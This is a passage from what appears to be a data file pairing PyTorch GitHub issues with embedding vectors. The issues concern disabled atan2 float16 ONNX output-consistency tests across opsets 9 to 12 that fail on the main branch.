 -0.3071285   0.05925307 -0.318089   -0.04976539  0.27366167 -0.20641185
 -0.06368134  0.3394048   0.23003116 -0.19391854 -0.03879116  0.32120532
 -0.02766697  0.59782064 -0.03802908 -0.08683202 -0.0612824   0.5542862
  0.4217509  -0.08363372 -0.2527683   0.26462376 -0.06656826  0.12932366
  0.1931848   0.5180218  -0.07301069 -0.4041447  -0.02786405 -0.13918413
  0.05940437  0.22217774  0.30280244 -0.05563013  0.16572319 -0.11179578
 -0.38163546  0.26740795 -0.02322865 -0.17399746  0.374511    0.12867668
 -0.24992897 -0.14950086 -0.3606962  -0.35325772  0.5195857   0.8944242
 -0.3962768  -0.26871598  0.4494715   0.07658463 -0.5004925   0.19678222
 -0.02889667  0.09101092  0.02829563 -0.13385895  0.17243972  0.11883863
 -0.56438535  0.14521915 -0.42280465  0.15079388 -0.05797612  0.1349817
 -0.13222374  0.26027435 -0.05905779  0.2831155  -0.09921227  0.22693565
  0.0064718   0.59425473  0.46169826  0.11492085 -0.2155984   0.43281925
  0.28193566 -0.28592178  0.09285849  0.499229    0.19361757 -0.14569446]"
DISABLED test_output_match_atan2_cpu_float16 (__main__.TestOnnxModelOutputConsistency_opset12CPU) module: onnx triaged skipped,"Platforms: linux

This test was disabled because it is failing on main branch ([recent examples](https://hud.pytorch.org/failure?name=pull%20%2F%20linux-focal-py3.8-clang10-onnx%20%2F%20test%20(default%2C%202%2C%202%2C%20linux.2xlarge)&jobName=undefined&failureCaptures=%5B%22onnx%2Ftest_op_consistency.py%3A%3ATestOnnxModelOutputConsistency_opset12CPU%3A%3Atest_output_match_atan2_cpu_float16%22%5D)).

Same as https://github.com/pytorch/pytorch/issues/113526",False,"[-2.56880164e-01  9.24068913e-02 -3.37572336e-01 -2.23393470e-01
 -1.18535087e-01 -2.70536244e-01  2.13593647e-01  2.91831903e-02
 -5.72507739e-01 -3.32072675e-01  3.82035881e-01  7.49796778e-02
  2.07276940e-01 -1.27034828e-01 -2.69876510e-01 -3.36721808e-01
  3.85202542e-02 -3.71390581e-01  3.10081303e-01 -2.91484464e-02
 -3.14907432e-01 -1.08144134e-01 -3.01677793e-01  1.50436223e-01
  1.28200829e-01  1.47429273e-01  4.23520952e-02  1.81864388e-03
  1.35718778e-01  1.47214890e-01  1.93135053e-01  4.17230546e-01
 -3.11969519e-01 -6.34009317e-02  2.53008306e-01  1.59236416e-02
 -3.49897504e-01 -1.70288473e-01 -1.75224692e-01 -2.46184707e-01
  1.14788331e-01  1.61810666e-01  3.23348772e-03  1.07609823e-01
  2.35588625e-02 -1.04489058e-01 -1.94194466e-01  1.01256996e-01
 -2.52349675e-01  1.58606153e-02  5.22184372e-02  3.01477760e-02
 -5.92263043e-02 -1.54299140e-01  1.94477707e-01 -1.65363461e-01
  1.06425118e-02  3.49551618e-01 -9.85976607e-02  1.96589410e-01
  8.22874010e-02 -1.78993732e-01 -1.76919028e-02 -1.14886209e-01
  3.88019234e-02  8.86800289e-02  3.29552948e-01 -2.32374579e-01
  3.85089576e-01  1.46471232e-01  8.86248201e-02 -8.69585648e-02
 -2.85488009e-01  1.03572771e-01  1.64346248e-01  2.65810400e-01
 -2.49312922e-01  2.20195130e-02  1.93268172e-02 -2.51503825e-01
 -1.14929646e-01  3.43341120e-02  9.60467160e-02 -4.87489477e-02
  2.54607826e-01 -2.62385122e-02 -5.24808876e-02 -1.65697426e-01
  1.12345219e-01 -1.33322567e-01  4.53655303e-01  2.53996581e-01
 -1.40777260e-01 -4.60789427e-02  8.03958997e-03  1.26339316e-01
 -3.62763442e-02  9.38127935e-03 -3.06622922e-01  3.14227104e-01
  1.49764732e-01 -3.02136540e-01 -2.80343473e-01  3.32804501e-01
 -4.20815766e-01 -3.94976810e-02  1.04299128e-01 -7.80594945e-02
 -5.51207624e-02 -2.74922345e-02  1.01879381e-01  5.94362020e-02
  3.59356962e-03  1.36430472e-01  1.17251985e-01 -1.08817168e-01
  1.82673410e-01 -2.15657383e-01  1.34904549e-01  2.25008279e-01
 -2.31781408e-01 -1.36709169e-01  1.75118260e-02  1.57298952e-01
  2.27856755e-01  3.67198177e-02 -9.23083499e-02  1.42455757e-01
  1.48268059e-01 -2.57051170e-01  4.04495522e-02 -1.30461603e-01
 -3.22301447e-01 -1.46500438e-01  1.71590865e-01  9.83163863e-02
 -5.86798340e-02 -2.53401935e-01 -7.68996254e-02  6.70541003e-02
 -8.61776769e-02 -4.33758013e-02  2.42168158e-01 -5.23319319e-02
  2.92119414e-01  3.60976625e-03 -1.75946012e-01  2.37811357e-01
  6.70811906e-02  3.25565219e-01  1.12008184e-01 -1.10910751e-01
  1.06556803e-01  6.67317808e-01  3.16137932e-02  1.29589960e-01
  1.47442788e-01  2.51818774e-03 -5.86323962e-02 -2.45726198e-01
 -2.90939864e-02  3.17603290e-01 -1.94736794e-01 -1.47333920e-01
  2.93609887e-01 -3.80752236e-03 -1.70054644e-01  7.29247034e-02
 -2.29357824e-01  9.11965296e-02 -2.50266969e-01 -1.09009162e-01
  9.67266262e-02 -4.07750160e-03  1.35336481e-02 -1.79695725e-01
  2.14616179e-01 -4.00370359e-01  1.76245291e-02  2.81789064e-01
  1.05341978e-01  7.44468123e-02  4.05905187e-01  1.72429532e-01
  2.46688463e-02  4.25980031e-01  1.74435541e-01  4.44455966e-02
 -1.72375351e-01 -2.14750886e-01 -4.61711675e-01 -3.28421593e-05
  5.81579283e-03  1.48810357e-01 -2.33502164e-01 -5.23104191e-01
  6.49614781e-02 -1.02961019e-01  3.49514857e-02 -6.19806163e-02
  2.18030829e-02  1.78211033e-01  3.79288226e-01 -1.59165695e-01
 -1.13501936e-01  7.68601969e-02 -2.87298083e-01 -3.58212858e-01
  1.94283426e-01  1.29461169e-01 -2.96946883e-01 -1.35633871e-01
 -6.81032613e-02 -2.64447451e-01 -1.65158845e-02 -1.57990813e-01
 -5.84451109e-02  1.02314018e-02 -3.90082188e-02  3.75216365e-01
  5.00305928e-02  6.41255453e-02 -2.13350475e-01 -8.42529535e-02
 -2.71804959e-01  1.92623883e-02 -2.54844010e-01  4.36724909e-02
 -2.30929673e-01 -4.85465042e-02 -9.53276604e-02 -1.55622527e-01
  1.10577956e-01 -1.42428465e-02  3.36574674e-01  2.75349431e-02
 -2.19868645e-01 -3.14523280e-01 -3.14510643e-01  2.50313282e-01
 -2.66457617e-01 -3.26000214e-01 -1.19602151e-01 -1.38218269e-01
  2.69952297e-01  3.09275419e-01  1.39682040e-01  1.52251795e-01
 -6.15265742e-02 -2.70111114e-03  1.36158407e-01 -3.29124600e-01
  1.12278089e-01 -9.20797363e-02  1.98892742e-01  9.36616734e-02
  3.82782936e-01  7.05286255e-03  2.72936463e-01 -1.52810782e-01
  1.80379916e-02  3.08090806e-01 -7.91568682e-02  5.43267190e-01
  2.14927763e-01  4.14767899e-02 -8.77384767e-02  2.96911329e-01
 -1.45363659e-01 -1.10963836e-01  2.45698437e-01 -3.54895502e-01
  2.01350212e-01  3.21074799e-02  1.37657255e-01 -3.02135229e-01
  5.78482151e-01  4.05262113e-02 -3.44245285e-02  3.40012163e-02
  2.17352241e-01  1.99599087e-01 -1.85260661e-02  1.64663628e-01
  3.48295599e-01 -3.42212468e-01 -2.35769510e-01 -1.98412716e-01
 -1.04004163e-02 -2.59486258e-01 -9.94558409e-02  6.68430775e-02
  2.78413922e-01  1.13520600e-01 -3.42536330e-01  4.57196310e-02
  2.57782340e-01 -5.23178950e-02  2.78719544e-01 -1.54594202e-02
 -1.97958276e-01  3.50858457e-02  2.11271927e-01 -2.40570530e-02
 -1.49731249e-01 -5.09015322e-02  1.87639445e-01  8.05696920e-02
  3.39016140e-01 -3.65346134e-01  2.70683169e-01  3.91137719e-01
  4.70161885e-02  1.72780335e-01 -1.19587012e-01  2.22557206e-02
 -1.16855942e-01  1.09120615e-01  8.32051635e-02  1.07979119e-01
  2.73550868e-01 -2.62377113e-01 -3.77020091e-01  7.02032596e-02
  9.47933197e-02 -1.78733438e-01 -1.77164972e-01 -3.28069627e-01
  6.72080740e-02 -1.15504257e-01  1.58666745e-02  2.03815177e-02
 -4.83328342e-01  1.07450739e-01  7.09821433e-02 -1.55451462e-01
 -2.95860767e-02  3.25318992e-01  1.42303213e-01 -3.11054885e-01
  4.47564311e-02 -1.34707749e-01 -3.66453715e-02 -1.41649202e-01
 -2.62979180e-01  5.69569170e-02  2.01028749e-01  8.14978033e-02
  1.46318585e-01  2.21955851e-01 -2.50214249e-01 -2.10230500e-01
  6.61425292e-02 -9.79233086e-02 -2.15296805e-01  4.57120717e-01
  7.29938149e-02  6.17494360e-02  4.00408745e-01  3.37346584e-01
 -3.67510378e-01 -1.89939678e-01 -1.65184587e-01 -2.51852691e-01
  2.74933446e-02 -1.60044074e-01  2.05838680e-03  3.71531546e-02
  2.82111615e-01  1.07929192e-01 -3.95540744e-01  1.54009044e-01
 -2.67113090e-01 -1.01571783e-01  3.01371068e-01 -2.23962516e-01
  1.02394447e-01 -2.44204149e-01  7.89590329e-02 -1.11211300e-01
  7.54241198e-02  1.20629251e-01 -5.32769263e-02  2.34126389e-01]"
DISABLED test_output_match_atan2_cpu_float16 (__main__.TestOnnxModelOutputConsistency_opset11CPU) module: onnx triaged skipped,"Platforms: linux

This test was disabled because it is failing on main branch ([recent examples](https://hud.pytorch.org/failure?name=pull%20%2F%20linux-focal-py3.8-clang10-onnx%20%2F%20test%20(default%2C%202%2C%202%2C%20linux.2xlarge)&jobName=undefined&failureCaptures=%5B%22onnx%2Ftest_op_consistency.py%3A%3ATestOnnxModelOutputConsistency_opset11CPU%3A%3Atest_output_match_atan2_cpu_float16%22%5D)).

Same as https://github.com/pytorch/pytorch/issues/113526",False,"[-2.52263993e-01  9.37496722e-02 -3.48642766e-01 -2.08827049e-01
 -1.20301753e-01 -2.67436951e-01  2.31648684e-01  2.92421132e-02
 -5.63142180e-01 -3.34684283e-01  3.79477590e-01  7.04233721e-02
  2.09739208e-01 -1.19507663e-01 -2.69791543e-01 -3.39992732e-01
  4.23983298e-02 -3.72540802e-01  3.02323461e-01 -3.20888497e-02
 -3.28990996e-01 -1.05992176e-01 -2.95096219e-01  1.52611524e-01
  1.23063825e-01  1.38699695e-01  4.92358282e-02  5.22112474e-03
  1.28333464e-01  1.39344200e-01  1.90434799e-01  4.26984578e-01
 -3.19673091e-01 -7.02496469e-02  2.45065808e-01  1.53096002e-02
 -3.39124203e-01 -1.73967704e-01 -1.73910215e-01 -2.55488306e-01
  1.05959259e-01  1.56769216e-01 -7.16859475e-04  1.09815091e-01
  2.86538862e-02 -1.10235766e-01 -1.95032954e-01  1.02662720e-01
 -2.48030677e-01  1.60027053e-02  4.29730490e-02  3.09273340e-02
 -4.91678417e-02 -1.52318388e-01  1.90264210e-01 -1.69668704e-01
  1.09732281e-02  3.48440409e-01 -9.82030928e-02  1.87108397e-01
  7.59112909e-02 -1.70049503e-01 -1.10281184e-02 -1.11254975e-01
  3.57330143e-02  8.64444524e-02  3.25224161e-01 -2.27665514e-01
  3.85740548e-01  1.44122064e-01  8.62885118e-02 -8.90037715e-02
 -2.84631670e-01  9.63993073e-02  1.64731190e-01  2.67137706e-01
 -2.49737501e-01  2.04748753e-02  1.34238740e-02 -2.54964352e-01
 -1.17120445e-01  1.61071010e-02  9.27736089e-02 -5.91621771e-02
  2.55796343e-01 -1.60976965e-02 -5.63170500e-02 -1.74131349e-01
  1.08770967e-01 -1.25949353e-01  4.54403132e-01  2.41130263e-01
 -1.31456330e-01 -4.25720289e-02  1.86880045e-02  1.27563462e-01
 -3.77204530e-02  1.78906471e-02 -3.12263340e-01  3.19783449e-01
  1.45275533e-01 -2.94233859e-01 -2.73451388e-01  3.45200926e-01
 -4.15652037e-01 -4.23204415e-02  1.05195805e-01 -7.75519609e-02
 -5.49065173e-02 -3.08236033e-02  1.13940671e-01  5.51040098e-02
  1.78806186e-02  1.44219354e-01  1.20398425e-01 -1.18149251e-01
  1.88751966e-01 -2.14532584e-01  1.31329417e-01  2.19619870e-01
 -2.32401878e-01 -1.37077913e-01  2.02720277e-02  1.50043279e-01
  2.23805547e-01  4.17540669e-02 -8.75255466e-02  1.41432881e-01
  1.37054712e-01 -2.54727721e-01  3.80855836e-02 -1.23024993e-01
 -3.18328559e-01 -1.53025851e-01  1.61455795e-01  9.10289735e-02
 -6.11159503e-02 -2.56151050e-01 -7.79314041e-02  7.23067373e-02
 -9.07809436e-02 -5.05905151e-02  2.47864679e-01 -5.09502776e-02
  2.91556895e-01 -2.16944702e-03 -1.80609211e-01  2.33906716e-01
  6.83368891e-02  3.25580508e-01  1.12953693e-01 -1.10946670e-01
  1.01673767e-01  6.68935418e-01  3.48415598e-02  1.29950777e-01
  1.42141700e-01 -1.66600570e-04 -6.69517815e-02 -2.41344571e-01
 -2.97079273e-02  3.13237667e-01 -1.92836061e-01 -1.32812709e-01
  2.95740306e-01  2.81125121e-03 -1.63255125e-01  8.68870169e-02
 -2.35606641e-01  8.75851661e-02 -2.39773393e-01 -1.02808669e-01
  9.74233076e-02 -7.04588555e-03  1.54971201e-02 -1.77587032e-01
  2.10995540e-01 -3.95502031e-01  8.03210773e-03  2.85953104e-01
  1.01584248e-01  8.30432847e-02  4.06474769e-01  1.79818600e-01
  2.17924714e-02  4.25725549e-01  1.72023118e-01  5.10815941e-02
 -1.70476750e-01 -2.10930437e-01 -4.61516649e-01  5.91825880e-03
  6.61418214e-03  1.45757258e-01 -2.34101593e-01 -5.25288463e-01
  5.96102178e-02 -1.12481073e-01  3.70216146e-02 -5.33885807e-02
  1.84217356e-02  1.74574494e-01  3.80672157e-01 -1.73131898e-01
 -1.00793071e-01  7.37109929e-02 -2.91369319e-01 -3.59182090e-01
  2.14416131e-01  1.20636716e-01 -3.02085996e-01 -1.29024759e-01
 -6.09630980e-02 -2.66388834e-01 -2.31679194e-02 -1.61326915e-01
 -5.24865091e-02 -2.26515345e-04 -3.08985189e-02  3.91758293e-01
  6.13182336e-02  5.85819632e-02 -2.11104661e-01 -8.43883008e-02
 -2.60649323e-01  1.10472562e-02 -2.58687019e-01  4.18176390e-02
 -2.20910341e-01 -4.46835086e-02 -9.45954472e-02 -1.56819448e-01
  1.00386873e-01 -2.71047670e-02  3.32071543e-01  3.11318077e-02
 -2.13744909e-01 -3.16555560e-01 -3.14923733e-01  2.56771266e-01
 -2.62985766e-01 -3.39700639e-01 -1.29036367e-01 -1.27948508e-01
  2.68963993e-01  3.09971213e-01  1.28489286e-01  1.52226329e-01
 -6.19449131e-02 -3.88090685e-03  1.35056674e-01 -3.24103594e-01
  1.02645732e-01 -8.96666199e-02  2.06548899e-01  8.85570794e-02
  3.90230268e-01 -2.11453997e-04  2.80346572e-01 -1.52334556e-01
  2.15405375e-02  3.13772202e-01 -8.07138160e-02  5.43614984e-01
  2.18730718e-01  3.59233059e-02 -9.41289663e-02  3.04024577e-01
 -1.49059966e-01 -9.56999063e-02  2.31723964e-01 -3.59255731e-01
  1.96239859e-01  2.53026523e-02  1.40811861e-01 -3.13793719e-01
  5.79168677e-01  5.05552068e-02 -3.68511640e-02  3.20705548e-02
  2.21208289e-01  1.99108094e-01 -2.20331755e-02  1.72769994e-01
  3.53654146e-01 -3.31612647e-01 -2.21590191e-01 -2.00466335e-01
 -1.34850554e-02 -2.69348174e-01 -9.94207412e-02  7.90078491e-02
  2.81979084e-01  1.05703756e-01 -3.29589427e-01  4.18779701e-02
  2.55213320e-01 -5.34069315e-02  2.80309111e-01 -6.55687414e-03
 -2.03186929e-01  4.15494666e-02  2.15572715e-01 -1.67231075e-02
 -1.42295584e-01 -4.53868285e-02  1.90098539e-01  8.03503543e-02
  3.34422171e-01 -3.56328607e-01  2.70716429e-01  3.93085539e-01
  5.02316430e-02  1.67563617e-01 -1.09467499e-01  1.68465041e-02
 -1.14865102e-01  1.09684750e-01  8.11644495e-02  1.13709256e-01
  2.65362740e-01 -2.66567141e-01 -3.86962414e-01  6.46714792e-02
  9.35409367e-02 -1.83423877e-01 -1.76853478e-01 -3.27275723e-01
  6.57015592e-02 -1.25648931e-01  8.91361944e-03  1.94210336e-02
 -4.76134151e-01  1.14046499e-01  6.09826148e-02 -1.59313679e-01
 -2.40364932e-02  3.28094453e-01  1.36586428e-01 -3.05022717e-01
  4.27069813e-02 -1.38845265e-01 -4.36810851e-02 -1.47436768e-01
 -2.63233662e-01  5.24916761e-02  1.88882649e-01  8.32341760e-02
  1.46976128e-01  2.09838480e-01 -2.51684159e-01 -2.16681987e-01
  6.45933151e-02 -8.88425633e-02 -2.12710097e-01  4.60298598e-01
  6.90468699e-02  7.55148157e-02  3.91456187e-01  3.31515938e-01
 -3.68533969e-01 -1.97733432e-01 -1.64903075e-01 -2.50093877e-01
  1.37155354e-02 -1.61173970e-01 -6.17593154e-03  3.65783274e-02
  2.91579396e-01  1.03818908e-01 -3.97681653e-01  1.59500450e-01
 -2.64007270e-01 -9.90356877e-02  2.94907153e-01 -2.16190845e-01
  1.03466734e-01 -2.38602638e-01  8.70013535e-02 -1.10390805e-01
  8.25526267e-02  1.16803102e-01 -6.37007207e-02  2.46156543e-01]"
DISABLED test_output_match_atan2_cpu_float16 (__main__.TestOnnxModelOutputConsistency_opset10CPU) module: onnx triaged skipped,"Platforms: linux

This test was disabled because it is failing on main branch ([recent examples](https://hud.pytorch.org/failure?name=pull%20%2F%20linux-focal-py3.8-clang10-onnx%20%2F%20test%20(default%2C%202%2C%202%2C%20linux.2xlarge)&jobName=undefined&failureCaptures=%5B%22onnx%2Ftest_op_consistency.py%3A%3ATestOnnxModelOutputConsistency_opset10CPU%3A%3Atest_output_match_atan2_cpu_float16%22%5D)).

Same as https://github.com/pytorch/pytorch/issues/113526",False,"[-2.54143476e-01  1.00753225e-01 -3.42421323e-01 -2.07277417e-01
 -1.20408662e-01 -2.62505651e-01  2.20277697e-01  3.32073048e-02
 -5.72637200e-01 -3.38291377e-01  3.73039603e-01  7.45179355e-02
  2.07431346e-01 -1.21218279e-01 -2.70882010e-01 -3.28374624e-01
  4.29487377e-02 -3.63825798e-01  2.97680348e-01 -2.62382403e-02
 -3.34426463e-01 -1.06905147e-01 -2.90408254e-01  1.50232881e-01
  1.20140284e-01  1.42094791e-01  4.00218591e-02  6.57326635e-03
  1.36358947e-01  1.42058283e-01  1.98081762e-01  4.15577561e-01
 -3.11254323e-01 -6.01813570e-02  2.45335311e-01  1.16952267e-02
 -3.42530280e-01 -1.78751737e-01 -1.70740396e-01 -2.52378464e-01
  1.15036085e-01  1.62709236e-01 -8.94472003e-03  1.10046551e-01
  2.57172808e-02 -9.92457867e-02 -1.90868258e-01  9.74546596e-02
 -2.52610534e-01  1.58013497e-02  4.65715267e-02  2.69993097e-02
 -6.36647642e-02 -1.62242740e-01  2.00753421e-01 -1.62619561e-01
  8.01931322e-03  3.50494117e-01 -9.26941484e-02  1.84143782e-01
  6.89327419e-02 -1.73296034e-01 -1.91142056e-02 -1.14324510e-01
  4.30376157e-02  8.64127725e-02  3.28696042e-01 -2.22556621e-01
  3.76461446e-01  1.45586267e-01  9.40302461e-02 -8.97385925e-02
 -2.86536932e-01  1.02969617e-01  1.58896029e-01  2.69243747e-01
 -2.48037055e-01  1.51670212e-02  1.26227671e-02 -2.56057739e-01
 -1.17126241e-01  2.60206051e-02  9.11013335e-02 -4.57746536e-02
  2.58337826e-01 -1.66734345e-02 -5.32429852e-02 -1.67194486e-01
  1.10559069e-01 -1.30236328e-01  4.54382718e-01  2.45003209e-01
 -1.38972670e-01 -4.83011603e-02  1.98686589e-02  1.26110554e-01
 -4.06774059e-02  1.67319439e-02 -3.13725173e-01  3.19699168e-01
  1.54271960e-01 -3.02970529e-01 -2.72541046e-01  3.44047099e-01
 -4.17383134e-01 -3.24913859e-02  9.97763276e-02 -7.74051994e-02
 -5.94840348e-02 -2.57694852e-02  1.13466956e-01  5.87614998e-02
  8.79297033e-03  1.35306239e-01  1.08811513e-01 -1.20129198e-01
  1.80431291e-01 -2.12863013e-01  1.22541636e-01  2.22281903e-01
 -2.28910446e-01 -1.37461185e-01  2.26133242e-02  1.48788273e-01
  2.18588322e-01  3.43929008e-02 -8.83015543e-02  1.42315671e-01
  1.42899305e-01 -2.61638403e-01  4.19540331e-02 -1.27673179e-01
 -3.14800501e-01 -1.42368346e-01  1.58763230e-01  9.10788178e-02
 -5.20963408e-02 -2.54282176e-01 -8.18112642e-02  6.86145872e-02
 -8.61532539e-02 -4.83004302e-02  2.46523052e-01 -5.19481599e-02
  3.03455859e-01 -2.39558984e-03 -1.82074726e-01  2.43767321e-01
  7.25478455e-02  3.22707862e-01  1.13126807e-01 -1.11804366e-01
  9.04718041e-02  6.64142072e-01  2.73394361e-02  1.28033251e-01
  1.54538184e-01 -2.83915084e-04 -6.47647977e-02 -2.42172360e-01
 -2.39992160e-02  3.13337982e-01 -1.94309086e-01 -1.29455566e-01
  2.84886807e-01 -3.67251597e-03 -1.71736494e-01  7.52859488e-02
 -2.39627451e-01  9.27203596e-02 -2.50535429e-01 -1.00998238e-01
  9.20290798e-02 -4.09962051e-03  1.59645416e-02 -1.78124964e-01
  2.13222161e-01 -3.88450861e-01  7.78440759e-03  2.82324553e-01
  9.37915742e-02  7.12327957e-02  4.11162943e-01  1.66521862e-01
  2.73107812e-02  4.34834868e-01  1.71345145e-01  5.06062172e-02
 -1.72280952e-01 -2.16301560e-01 -4.67279166e-01  2.25330889e-03
  1.44384094e-02  1.53382823e-01 -2.37867862e-01 -5.28239846e-01
  6.38710856e-02 -1.13744281e-01  4.25576717e-02 -4.78436649e-02
  1.58045609e-02  1.73258394e-01  3.76269639e-01 -1.57112777e-01
 -1.00290358e-01  8.34256336e-02 -2.92543113e-01 -3.62468272e-01
  2.10674196e-01  1.17605656e-01 -2.96611369e-01 -1.32183000e-01
 -6.21412210e-02 -2.52694935e-01 -2.19584405e-02 -1.54902190e-01
 -4.97719087e-02  1.37020908e-02 -2.16000807e-02  3.72262865e-01
  5.79905435e-02  5.18848076e-02 -2.15775833e-01 -8.37961212e-02
 -2.62223810e-01  1.69273037e-02 -2.64245957e-01  4.69835512e-02
 -2.30551809e-01 -4.49415408e-02 -9.45960581e-02 -1.57474697e-01
  9.10210013e-02 -2.70386115e-02  3.30567062e-01  2.56447978e-02
 -1.95967674e-01 -3.22683632e-01 -3.15350771e-01  2.45638520e-01
 -2.59924948e-01 -3.28915805e-01 -1.28050551e-01 -1.30860597e-01
  2.63427436e-01  3.19038212e-01  1.30901113e-01  1.65809780e-01
 -5.66642210e-02 -1.00449473e-03  1.36537105e-01 -3.32317173e-01
  1.10885449e-01 -9.58471000e-02  2.00093746e-01  9.62115601e-02
  3.96333307e-01 -4.68906807e-03  2.80791759e-01 -1.48224160e-01
  2.20034048e-02  3.18400770e-01 -7.50186592e-02  5.52981615e-01
  2.15887100e-01  3.29424888e-02 -9.11339596e-02  2.93747842e-01
 -1.47776008e-01 -1.04450248e-01  2.19882011e-01 -3.64037514e-01
  2.04307586e-01  2.18801778e-02  1.37721747e-01 -2.99610615e-01
  5.83910346e-01  4.70003784e-02 -3.59061435e-02  3.33772525e-02
  2.26144135e-01  2.04012856e-01 -2.40861811e-02  1.69322982e-01
  3.47762644e-01 -3.40559602e-01 -2.25737259e-01 -1.97393551e-01
 -1.18259788e-02 -2.65801072e-01 -9.99090075e-02  7.01290369e-02
  2.71948755e-01  1.07380837e-01 -3.36950213e-01  4.53451127e-02
  2.57739902e-01 -5.77865876e-02  2.85666168e-01 -1.68783460e-02
 -2.07791358e-01  4.32792269e-02  2.15364873e-01 -7.22584315e-03
 -1.34172395e-01 -4.54457365e-02  1.92437142e-01  7.86137134e-02
  3.31678331e-01 -3.62469375e-01  2.76106864e-01  3.87073725e-01
  4.67508957e-02  1.67166114e-01 -1.06805861e-01  2.14386266e-02
 -1.03637479e-01  1.11627094e-01  8.60073939e-02  1.02123693e-01
  2.72634834e-01 -2.67306566e-01 -3.71256620e-01  7.26037323e-02
  8.46621767e-02 -1.86154217e-01 -1.75647289e-01 -3.37280929e-01
  6.40954822e-02 -1.19139105e-01  1.98808406e-02  2.29246430e-02
 -4.85668719e-01  1.07477657e-01  6.21416494e-02 -1.59028351e-01
 -2.41116565e-02  3.24417353e-01  1.42962903e-01 -3.03667963e-01
  4.40465249e-02 -1.37129307e-01 -3.44274491e-02 -1.42700046e-01
 -2.62375593e-01  5.29712513e-02  1.93377689e-01  8.65303874e-02
  1.50738090e-01  2.09416598e-01 -2.45208710e-01 -2.21860737e-01
  6.79979026e-02 -9.96632874e-02 -2.24121124e-01  4.60577220e-01
  7.22666904e-02  7.99860135e-02  3.86626899e-01  3.41749519e-01
 -3.63060772e-01 -1.89270318e-01 -1.62900612e-01 -2.44923532e-01
  2.71678530e-02 -1.64225489e-01  1.36876293e-03  3.37636396e-02
  2.85251796e-01  9.51456428e-02 -3.89962882e-01  1.58006877e-01
 -2.69581378e-01 -1.05928846e-01  2.96071827e-01 -2.15047002e-01
  1.06934980e-01 -2.44574234e-01  8.40437934e-02 -1.05924964e-01
  7.20395148e-02  1.12153202e-01 -5.67324534e-02  2.35528558e-01]"
DISABLED test_output_match_atan2_cpu_float16 (__main__.TestOnnxModelOutputConsistency_opset9CPU) module: onnx triaged skipped,"Platforms: linux

This test was disabled because it is failing on main branch ([recent examples](https://hud.pytorch.org/failure?name=pull%20%2F%20linux-focal-py3.8-clang10-onnx%20%2F%20test%20(default%2C%202%2C%202%2C%20linux.2xlarge)&jobName=linux-focal-py3.8-clang10-onnx%20%2F%20test%20(default%2C%202%2C%202%2C%20linux.2xlarge)&failureCaptures=%5B%22onnx%2Ftest_op_consistency.py%3A%3ATestOnnxModelOutputConsistency_opset9CPU%3A%3Atest_output_match_atan2_cpu_float16%22%5D)).

This is failing in trunk after https://github.com/pytorch/pytorch/pull/113404, for example https://hud.pytorch.org/pytorch/pytorch/commit/39ca5a3226331428465a84d53d5b50dfb4406cfe.  The tests didn't fail on PR.

cc @BowenBao @justinchuby ",False,"[-2.56069660e-01  9.33443606e-02 -3.48522127e-01 -2.18252376e-01
 -1.22759618e-01 -2.69254088e-01  2.21342534e-01  3.05314213e-02
 -5.71231484e-01 -3.32219958e-01  3.83352160e-01  6.84101284e-02
  2.14739949e-01 -1.19108535e-01 -2.67622173e-01 -3.34200978e-01
  4.56846431e-02 -3.73491734e-01  3.06785762e-01 -2.23233458e-02
 -3.33103776e-01 -1.12361982e-01 -2.99906194e-01  1.54166982e-01
  1.19070739e-01  1.46063358e-01  3.69526669e-02  1.07273562e-02
  1.30013004e-01  1.52182803e-01  1.91001117e-01  4.23524588e-01
 -3.15256447e-01 -6.21214584e-02  2.47221336e-01  1.82051994e-02
 -3.44192177e-01 -1.66372240e-01 -1.68005496e-01 -2.49914750e-01
  1.18839972e-01  1.59267262e-01 -2.42089294e-03  1.10016383e-01
  2.62010545e-02 -1.03323311e-01 -1.90426469e-01  9.79812071e-02
 -2.51542449e-01  7.28698028e-03  3.80356126e-02  2.59142444e-02
 -5.92004955e-02 -1.52380526e-01  1.92781568e-01 -1.69016346e-01
  1.53307244e-02  3.53609174e-01 -1.00969620e-01  1.87056422e-01
  7.74041265e-02 -1.66402251e-01 -1.37331504e-02 -1.08597279e-01
  4.42739576e-02  8.38295966e-02  3.30713212e-01 -2.29993835e-01
  3.86963964e-01  1.50356010e-01  9.36696976e-02 -8.84038806e-02
 -2.89950520e-01  1.02593355e-01  1.61913991e-01  2.74092734e-01
 -2.53523111e-01  2.08218135e-02  2.57496666e-02 -2.57585078e-01
 -1.11523382e-01  2.01206859e-02  9.25168544e-02 -4.28108945e-02
  2.54631579e-01 -2.04095226e-02 -5.77960685e-02 -1.67421535e-01
  1.16628900e-01 -1.32179976e-01  4.55217272e-01  2.55143732e-01
 -1.33248463e-01 -4.44309860e-02  3.19347531e-03  1.22140326e-01
 -3.94723788e-02  1.69748999e-02 -3.09440464e-01  3.22349906e-01
  1.52023524e-01 -2.99098194e-01 -2.76871324e-01  3.34710777e-01
 -4.12335157e-01 -3.51591036e-02  1.08701877e-01 -7.70388246e-02
 -6.00056425e-02 -2.26210840e-02  1.10362552e-01  6.38796538e-02
  6.47850381e-03  1.41077787e-01  1.07751131e-01 -1.05020292e-01
  1.85702741e-01 -2.12576494e-01  1.38494059e-01  2.22718239e-01
 -2.30945870e-01 -1.35767236e-01  2.30346844e-02  1.55820787e-01
  2.25328490e-01  4.38486263e-02 -8.91825408e-02  1.41386479e-01
  1.37195468e-01 -2.52031803e-01  4.33262549e-02 -1.37807295e-01
 -3.20222884e-01 -1.50674909e-01  1.69033960e-01  9.55966860e-02
 -5.93119711e-02 -2.54765064e-01 -8.19612443e-02  7.00559467e-02
 -7.94254839e-02 -4.07488272e-02  2.46067226e-01 -4.69296314e-02
  2.94019729e-01  3.00331973e-03 -1.78178534e-01  2.38647163e-01
  7.39029944e-02  3.15490544e-01  1.14194676e-01 -1.13123655e-01
  9.55736637e-02  6.65388405e-01  2.59741917e-02  1.25552014e-01
  1.53940096e-01  1.75534096e-03 -6.24177419e-02 -2.45057032e-01
 -2.41483375e-02  3.15825611e-01 -1.97003886e-01 -1.28770500e-01
  2.94958711e-01 -5.84006403e-03 -1.66387528e-01  7.82309249e-02
 -2.36341089e-01  8.80462378e-02 -2.45425120e-01 -1.05607599e-01
  8.82297456e-02 -2.81872787e-03  6.76989928e-03 -1.81984156e-01
  2.06317514e-01 -3.97886276e-01  1.16379764e-02  2.84205139e-01
  9.05443728e-02  7.74274915e-02  4.07387376e-01  1.71121418e-01
  2.33459845e-02  4.20406401e-01  1.71336755e-01  4.47613597e-02
 -1.77712798e-01 -2.22005427e-01 -4.66705739e-01 -8.09449703e-05
  4.87008877e-03  1.44204065e-01 -2.37720311e-01 -5.26955128e-01
